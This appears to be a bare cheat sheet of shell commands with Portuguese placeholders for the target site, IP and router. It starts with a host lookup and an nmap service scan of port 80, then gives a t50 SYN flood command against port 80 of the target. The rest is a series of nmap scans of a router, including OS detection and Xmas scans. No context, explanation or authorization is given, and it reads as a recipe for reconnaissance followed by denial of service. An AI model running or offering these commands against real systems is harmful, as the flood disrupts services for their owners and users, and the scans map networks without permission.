host site_aqui

nmap -sV -p 80 ip_aqui


sudo t50 ip_aqui --dport 80 --flood --syn --turbo 


nmap -v -A ip_aqui_roteador

nmap -O ip_aqui_roteador

nmap -PN ip_aqui_roteador

nmap -PA ip_aqui_roteador

nmap -sX ip_aqui_roteador
